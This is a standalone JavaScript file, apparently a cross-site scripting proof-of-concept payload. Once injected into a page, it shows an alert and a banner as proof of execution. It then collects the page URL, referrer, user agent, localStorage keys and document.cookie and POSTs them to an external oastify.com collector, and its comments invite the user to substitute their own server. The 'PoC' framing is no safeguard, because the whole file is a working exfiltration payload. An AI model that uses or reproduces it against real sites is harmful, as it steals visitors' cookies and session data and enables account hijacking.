/* payload.js — EDIT: set COLLECTOR variable to your collector URL */
(function () {
  try {
    // EDIT THIS
    var COLLECTOR = "https://67bdlwohe43s57bpag7avorm8de42vqk.oastify.com/recv"; // replace or use your server

    // Visible proof-of-execution
    try { alert("[PoC] payload.js executed on " + location.hostname); } catch(e) {}

    // Collect a small, low-sensitivity snapshot
    var payload = {
      time: new Date().toISOString(),
      url: location.href,
      origin: location.origin,
      ua: navigator.userAgent,
      ref: document.referrer,
      localStorageKeys: Object.keys(localStorage || {}),
      cookie: (function(){ try { return document.cookie || ""; } catch(e){ return "inaccessible"; } })()
    };

    // Fire-and-forget fetch (no-cors so it won't be blocked)
    try {
      fetch(COLLECTOR, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
    } catch(e){ /* ignore */ }

    // DOM proof
    var el = document.createElement('div');
    el.id = 'pocexecuted';
    el.style.cssText = 'position:fixed;bottom:4px;left:4px;padding:6px;border:2px solid #f00;background:#fff;z-index:2147483647';
    el.innerText = '[PoC] payload executed';
    document.body.appendChild(el);
  } catch (err) {
    console.error('payload.js error', err);
  }
})();
